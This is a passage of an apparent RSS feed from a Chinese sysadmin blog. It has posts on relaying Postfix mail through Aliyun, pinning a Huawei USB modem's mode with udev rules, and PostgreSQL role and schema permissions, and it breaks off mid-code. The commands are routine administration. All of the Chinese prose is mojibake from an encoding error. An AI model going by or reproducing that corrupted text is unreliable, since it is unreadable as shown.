&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_sender_dependent_authentication&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtp_destination_recipient_limit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;message_size_limit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;102400000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šï¼šè½¬å‘åˆ°é˜¿é‡Œé‚®ä»¶æœåŠ¡å™¨çš„æ ‡å‡†é…ç½®ï¼Œç½‘ç»œä¸Šå·²ç»æœ‰å¾ˆå¤šæ•™ç¨‹äº†ã€‚ç„¶åå…³é”®å°±ä¸€æ¡&lt;code&gt;smtp_destination_recipient_limit = 1&lt;/code&gt;,è¿™ä¸ªå°±ä¼šæŠŠç¾¤å‘çš„é‚®ä»¶æ‹†æˆå•ç‹¬çš„ä¸€å°ä¸€å°å‘é€ï¼Œå‘ä¸å‡ºå»çš„ä¼šå›åˆ°queueå°è¯•ä¸æ–­å‘é€ï¼Œæœ€åå¤±è´¥dropæ‰ã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–postfixç¼ºçœå‘é€é‚®ä»¶çš„å¤§å°æ˜¯10Mï¼Œé˜¿é‡Œé‚®å±€ç¼ºçœæ˜¯50Mï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œ&lt;code&gt;message_size_limit=102400000&lt;/code&gt;æ”¹æˆ100Mçš„é™åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åç”Ÿæˆä¸€ä¸‹é‚®ä»¶ç”¨æˆ·çš„hashåº“ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/postfix/sasl_passwd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;smtp.qiye.aliyun.com&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:587  report@ddky.com:xxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;postmap /etc/postfix/sasl_passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆå‘é‚®ä»¶çš„æ—¶å€™æŒ‡å®šè¿™å°æœåŠ¡å™¨ï¼Œç”¨æˆ·åæ˜¯ &lt;a href=&#34;mailto:report@ddky.com&#34;&gt;report@ddky.com&lt;/a&gt; , å¯†ç æ˜¯xxxxxxxxå°±å¯ä»¥äº†&lt;/p&gt;
&lt;p&gt;è¡¥å……ï¼Œéœ€è¦å®‰è£…ç¼ºå°‘çš„åº“ï¼Œå¦åˆ™ç™»å½•é˜¿é‡Œé‚®å±€è¿‡ä¸å»ï¼Œè¿˜éœ€è¦æ‰“å¼€æœåŠ¡å™¨çš„å…è®¸ç½‘æ®µåˆ—è¡¨ï¼Œmynetwork&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y cyrus-sasl-plain
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>voipçš„lsusbæ£€æµ‹åä¸ºçŒ«æ£’usbåœ°å€æ¥å›è·³åŠ¨</title>
      <link>https://rendoumi.com/posts/20240216-lsusb_huawei/</link>
      <pubDate>Fri, 16 Feb 2024 09:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240216-lsusb_huawei/</guid>
      <description>&lt;p&gt;è¿™ä¸æ˜¯è¦å‡ºå›½å°±æå‰æ­å»ºäº†ä¸€ä¸ªvoipçš„ç”µè¯ç³»ç»Ÿä¹ˆï¼Œç»“æœåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œåä¸ºçš„çŒ«æ£’å±…ç„¶å‡ºç°åœ°å€æ¥å›è·³åŠ¨çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;æ­£å¸¸æƒ…å†µä¸‹ï¼Œlsusbçš„ç»“æœ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsusb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 017: ID 12d1:1436 Huawei Technologies Co., Ltd. Broadband stick
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿‡ä¸€é˜µå­ï¼Œæˆ–è€…æŒç»­å‡ å¤©åï¼Œåœ°å€å°±å˜äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsusb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 017: ID 12d1:1446 Huawei Technologies Co., Ltd. HSPA modem
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹ä¸Šé¢ï¼Œvender idä»1436å˜æˆäº†1446ï¼Œåå­—ä¹Ÿä»stickå˜æˆäº†modem&lt;/p&gt;
&lt;p&gt;ç”±äºè¿™ä¸ªusbè®¾å¤‡æ˜¯ç›´é€šåˆ°kvmçš„freepbxè™šæœºé‡Œé¢å»çš„ï¼Œè¿™ç›´æ¥å¯¼è‡´voipç³»ç»Ÿä¸èƒ½ç”¨äº†ï¼Œå¯æ¶å•Šã€‚&lt;/p&gt;
&lt;p&gt;å¿…é¡»æŠŠå®ƒç»™å›ºå®šä¸‹æ¥ï¼Œé¦–å…ˆå…ˆä»1446å˜å›1436&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install use_modeswitch
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usb_modeswitch -v 12d1 -p &lt;span class=&#34;m&#34;&gt;1446&lt;/span&gt; -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr/share/usb_modeswitch/12d1:1446&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å˜å›æ¥äº†ä¸æˆï¼Œè¿˜å¾—æŠŠå®ƒå½»åº•å›ºå®šä¸‹æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /lib/udev/rules.d/40-usb_modeswitch.rules
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è£…äº†usb_modeswitchåå±…ç„¶å·²ç»è‡ªå¸¦äº†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Generic entry for most Huawei devices, excluding Android phones&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ATTRS&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;idVendor&lt;span class=&#34;o&#34;&gt;}==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;12d1&amp;#34;&lt;/span&gt;, ATTRS&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;manufacturer&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Android&amp;#34;&lt;/span&gt;, ATTR&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;bInterfaceNumber&lt;span class=&#34;o&#34;&gt;}==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;00&amp;#34;&lt;/span&gt;, ATTR&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;bInterfaceClass&lt;span class=&#34;o&#34;&gt;}==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;08&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;usb_modeswitch &amp;#39;%b/%k&amp;#39;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;shitï¼Œä¸ç®¡å®ƒï¼Œå†æ¬¡å¼ºè¡Œå›ºå®š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /lib/udev/rules.d/40-usb_modeswitch.rulesã€
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Huawei, newer modems&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ATTR&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;idVendor&lt;span class=&#34;o&#34;&gt;}==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;12d1&amp;#34;&lt;/span&gt;, ATTR&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;idProduct&lt;span class=&#34;o&#34;&gt;}==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1446&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;usb_modeswitch &amp;#39;%b/%k&amp;#39;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±æå®šäº†ï¼Œå¾—äºæå‰å‘ç°äº†è¿™é—®é¢˜ï¼Œå¦åˆ™è·‘åˆ°å›½å¤–å†å‘ç°ï¼Œå°±æ™šäº†ï¼&lt;/p&gt;</description>
    </item>
    <item>
      <title>PostgreSQLçš„ç”¨æˆ·æƒé™ç®¡ç†</title>
      <link>https://rendoumi.com/posts/20240205-postgres_user_manager/</link>
      <pubDate>Mon, 05 Feb 2024 10:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240205-postgres_user_manager/</guid>
      <description>&lt;p&gt;å…¬å¸é€‰ç”¨äº†é˜¿é‡Œäº‘çš„PolarDBåšæ•°æ®åº“ï¼Œè¿™ä¸ªä¸œè¥¿å…¶å®å°±æ˜¯Postgreså¢åŠ äº†å¤–æŒ‚ï¼Œå¯ä»¥æ”¯æŒOracleè¯­æ³•ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡åŠæ³•ï¼Œå¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹Postgresçš„ç”¨æˆ·ç®¡ç†äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PostgreSQLæƒé™æ¶æ„æ˜¯å®å¡”å½¢ç»“æ„&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æœ€ä¸Šå±‚æ˜¯å®ä¾‹&lt;/p&gt;
&lt;p&gt;å®ä¾‹ä¸­å…è®¸åˆ›å»ºå¤šä¸ªæ•°æ®åº“&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªæ•°æ®åº“ä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªschemaï¼Œ&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªschemaä¸‹é¢å¯ä»¥åˆ›å»ºå¤šä¸ªå¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹è±¡åŒ…æ‹¬è¡¨ã€ç‰©åŒ–è§†å›¾ã€æ“ä½œç¬¦ã€ç´¢å¼•ã€è§†å›¾ã€åºåˆ—ã€å‡½æ•°ã€â€¦ ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240205103517867&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240205-postgres_user_manager/image-20240205103517867.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢schemaä¸­æœ‰ä¸ªå¥‡æ€ªçš„ä¸œè¥¿ï¼Œpublicï¼Œæ³¨æ„ï¼šæ˜¯å°å†™ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ€»ç»“ï¼šPUBLICæ˜¯ç¼ºçœçš„æƒé™ï¼Œä»£è¡¨æ‰€æœ‰äººçš„æ„æ€ï¼ˆæ˜¯ä¸ªè§’è‰²ï¼‰ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œå…è®¸PUBLICè§’è‰²(å¤§å†™)è¿æ¥ï¼Œå³å…è®¸ä»»ä½•äººè¿æ¥ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°æ®åº“åœ¨åˆ›å»ºåï¼Œä¸å…è®¸é™¤äº†è¶…çº§ç”¨æˆ·å’Œowneræ‰€æœ‰è€…ä¹‹å¤–çš„ä»»ä½•äººåœ¨æ•°æ®åº“ä¸­åˆ›å»ºschemaã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œä¼šè‡ªåŠ¨åˆ›å»ºåä¸º public çš„schemaï¼Œè¿™ä¸ªschemaçš„allæƒé™å·²ç»èµ‹äºˆç»™PUBLICè§’è‰²ï¼ˆæ³¨æ„æ˜¯å¤§å†™ï¼‰ï¼Œå³å…è®¸ä»»ä½•äººåœ¨é‡Œé¢åˆ›å»ºå¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;schemaçº§åˆ«çš„æƒé™ï¼ŒåŒ…æ‹¬å…è®¸æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡(USAGE)ï¼Œä»¥åŠå…è®¸åœ¨schemaä¸­åˆ›å»ºå¯¹è±¡(CREATE)ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹æ–°å»ºçš„schemaçš„æƒé™ä¸ä¼šèµ‹äºˆç»™PUBLICè§’è‰²ï¼Œå› æ­¤é™¤äº†è¶…çº§ç”¨æˆ·å’Œownerï¼Œä»»ä½•äººéƒ½æ²¡æœ‰æƒé™æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡æˆ–è€…åœ¨schemaä¸­æ–°å»ºå¯¹è±¡ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä¸¾ä¾‹æ¥è¯´ï¼Œå»ºäº†ä¸ªåº“ï¼Œåˆå»ºäº†ç”¨æˆ·ï¼Œæ²¡ç»™è¿™ä¸ªç”¨æˆ·èµ‹äºˆä»»ä½•æƒé™ã€‚ç¼ºçœä»–å°±ä»PUBLICè§’è‰²ç»§æ‰¿äº†å¯¹åº“é‡Œçš„schema.pulicæƒé™ï¼Œå¯ä»¥è¿æ¥åˆ°è¿™ä¸ªschema.pulicï¼Œå¹¶ä¸”åœ¨è¿™é‡Œå»ºä¸´æ—¶è¡¨ã€å»ºè¡¨ã€viewç­‰ç­‰å¯¹è±¡ï¼Œä½†æ˜¯æ²¡åŠæ³•å»ºç«‹å…¶å®ƒschemaã€‚&lt;/p&gt;
&lt;p&gt;PostgreSQLçš„æ¨¡å¼ï¼ˆSCHEMAï¼‰å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªè¡¨çš„é›†åˆã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªæ¨¡å¼å¯ä»¥åŒ…å«è§†å›¾ã€ç´¢å¼•ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ“ä½œç¬¦ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;å†æ¥è¯´è§’è‰²ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨æ•°æ®åº“ä¸­æ‰€æœ‰çš„æƒé™éƒ½å’Œè§’è‰²æŒ‚é’©ã€‚&lt;/p&gt;
&lt;p&gt;è§’è‰²å’Œç”¨æˆ·çš„å”¯ä¸€åŒºåˆ«åœ¨äºï¼Œè§’è‰²æ˜¯&lt;code&gt;nologin&lt;/code&gt;çš„ï¼Œè€Œç”¨æˆ·å…è®¸&lt;code&gt;login&lt;/code&gt;ï¼Œä»…æ­¤è€Œå·²ã€‚&lt;/p&gt;
&lt;p&gt;è€Œ&amp;quot;PUBLIC&amp;quot;æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è§’è‰²ï¼Œä»£è¡¨ç€æ‰€æœ‰äººã€‚&lt;/p&gt;
&lt;p&gt;é‚£åˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;æ¯ä¸ª&lt;code&gt;PostgreSQL&lt;/code&gt;å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåä¸ºâ€œæ‰€æœ‰è€…â€çš„ç‰¹æ®Šè§’è‰²ã€‚åªæœ‰æ‰€æœ‰è€…æ‰èƒ½æ‰§è¡ŒæŸäº›æ“ä½œï¼Œå¦‚ &lt;code&gt;ALTER TABLE&lt;/code&gt; ï¼Œè€Œä½ ä¸èƒ½å°†è¿™æ ·çš„æƒé™æˆäºˆéæ‰€æœ‰è€…ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¸å¯èƒ½åªæœ‰ä¸€ä¸ªäººå¯ä»¥alterè¡¨ç»“æ„å§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è§’è‰²ç»§æ‰¿æ¥è§£å†³æ­¤é—®é¢˜ã€‚åˆ›å»º &lt;code&gt;table_owner&lt;/code&gt; è§’è‰²å¹¶ä¸” &lt;code&gt;GRANT table_owner TO user1, user2&lt;/code&gt; ï¼ˆuser1å’Œuser2ç»§æ‰¿table_owner)ï¼Œç„¶åèµ‹æƒ &lt;code&gt;ALTER TABLE my_table OWNER TO table_owner&lt;/code&gt; èµ‹äºˆ&lt;code&gt;table_owner&lt;/code&gt;æ‰€æœ‰è€…è§’è‰²ã€‚ç°åœ¨è¡¨çš„æ‰€æœ‰è€…æ˜¯ &lt;code&gt;table_owner&lt;/code&gt; äº†ï¼Œä½†æ˜¯å› ä¸º &lt;code&gt;user1&lt;/code&gt; å’Œ &lt;code&gt;user2&lt;/code&gt; æ˜¯è¯¥è§’è‰²çš„æˆå‘˜ï¼Œæ‰€ä»¥ä»–ä»¬ä¹Ÿå…·æœ‰ç»§æ‰¿æƒé™æ¥è¿è¡Œ &lt;code&gt;ALTER TABLE&lt;/code&gt;äº†ï¼Œå¦‚ä¸‹å›¾ ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240205113508881&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240205-postgres_user_manager/image-20240205113508881.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å•°å—¦äº†è¿™ä¹ˆå¤šï¼Œé™¤äº†ä¿®æ”¹pg_hba.confï¼Œèµ‹æƒçš„å‘½ä»¤å°±ä¸¤æ¡ï¼Œ&lt;code&gt;grant&lt;/code&gt;å’Œ&lt;code&gt;revoke&lt;/code&gt;ï¼Œçœ‹ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240205103610366&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240205-postgres_user_manager/image-20240205103610366.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿›å…¥å®æˆ˜ï¼Œé¦–å…ˆä»ä¸Šåˆ°ä¸‹éƒ½çœ‹ä¸€çœ‹ï¼Œæœ‰ä»€ä¹ˆåº“ï¼Œæœ‰ä»€ä¹ˆschemaï¼Œæœ‰ä»€ä¹ˆå¯¹è±¡ï¼Œæœ‰ä»€ä¹ˆè¡¨ï¼Œæœ‰ä»€ä¹ˆç´¢å¼•ï¼Œæœ‰ä»€ä¹ˆè§’è‰²ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ¨èç”¨psqlæ¥è¿›è¡Œç®¡ç†ï¼Œæœ‰å¾ˆå¤šå¿«æ·é”®ï¼Œnavicaté‡Œé¢æ˜¯æ²¡æœ‰çš„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ²¡æœ‰çš„è¯å°±è£…ä¸€ä¸ª&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install postgresql.x86_64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psql -h 10.8.2.61 -U admin 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¿…ç”¨å¿«æ·é”®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ—å‡ºæ‰€æœ‰çš„åº“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ—å‡ºæ‰€æœ‰çš„schema&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;n
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#çœ‹schema.publicæƒé™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;n+ public
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ—å‡ºæ‰€æœ‰çš„å¯¹è±¡ï¼ˆtable, view, sequencesï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ—å‡ºæ‰€æœ‰çš„è§’è‰²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;u
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ—å‡ºæ‰€æœ‰è¡¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;t
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ—å‡ºæ‰€æœ‰ç´¢å¼•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;i
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åŒæ ·çš„sql&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from pg_roles&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
